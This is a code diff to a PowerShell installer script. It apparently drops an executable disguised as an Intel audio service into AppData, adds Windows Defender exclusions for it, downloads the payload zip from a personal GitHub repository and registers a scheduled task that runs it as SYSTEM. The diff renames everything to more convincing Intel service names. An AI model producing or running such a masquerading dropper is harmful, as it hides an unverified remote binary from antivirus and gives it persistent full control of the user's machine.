@@ -7,12 +7,12 @@ if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
   }
 }
 
-$TargetPath = "$env:USERPROFILE\AppData\Roaming\Intel Corporation\Intel Audio Sync"
-$TargetFile = "$TargetPath\Intel Audio Sync.exe"
-$TargetZip = "$TargetPath\Intel Audio Sync.zip"
-$TargetLog = "$TargetPath\Intel Audio Sync.log"
+$TargetPath = "$env:USERPROFILE\AppData\Roaming\Intel Corporation\Intel Dynamic Audio Platform Service"
+$TargetFile = "$TargetPath\Intel Dynamic Audio Platform Service.exe"
+$TargetZip = "$TargetPath\Intel Dynamic Audio Platform Service.zip"
+$TargetLog = "$TargetPath\Intel Dynamic Audio Platform Service.log"
 $TargetScript = "$TargetPath\ias.ps1"
-$TargetXml = "$TargetPath\Start Thunderbolt audio service on boot if driver is up.xml"
+$TargetXml = "$TargetPath\IntelAudio.xml"
 
 if (Test-Path "$TargetFile") {
   Remove-Item -Force -Path "$TargetFile"
@@ -26,8 +26,8 @@ if (Test-Path "$TargetZip") {
   Write-Output "Project zip removed"
 }
 
-Add-MpPreference -ExclusionProcess 'Intel Audio Sync' -Force
-Add-MpPreference -ExclusionProcess 'Intel Audio Sync.exe' -Force
+Add-MpPreference -ExclusionProcess 'Intel Dynamic Audio Platform Service' -Force
+Add-MpPreference -ExclusionProcess 'Intel Dynamic Audio Platform Service.exe' -Force
 Add-MpPreference -ExclusionPath "$TargetPath" -Force
 Add-MpPreference -ExclusionPath "$TargetFile" -Force
 Add-MpPreference -ExclusionPath "$TargetLog" -Force
@@ -35,7 +35,7 @@ Add-MpPreference -ExclusionPath "$TargetScript" -Force
 Write-Output "Exclusions added"
 
 if (-Not (Test-Path "$TargetFile")) {
-  Invoke-WebRequest -Uri "https://github.com/B95segal/intelaudioservice/raw/refs/heads/main/x64/Release/Intel%20Audio%20Sync.zip" -OutFile "$TargetZip"
+  Invoke-WebRequest -Uri "https://github.com/B95segal/intelaudioservice/raw/refs/heads/main/x64/Release/Intel%20Dynamic%20Audio%20Platform%20Service.zip" -OutFile "$TargetZip"
   Write-Output "File downloaded"
   Expand-Archive -Path "$TargetZip" -DestinationPath "$TargetPath"
   Write-Output "File extracted"
@@ -43,4 +43,4 @@ if (-Not (Test-Path "$TargetFile")) {
   Write-Output "Zip file removed"
 }
 
-schtasks.exe /Create /XML $TargetXml /tn 'Intel Dynamic Management Audio Sync Service' /ru SYSTEM /f
+schtasks.exe /Create /XML $TargetXml /tn 'Intel Dynamic Platform Audio Sync Service' /ru SYSTEM /f
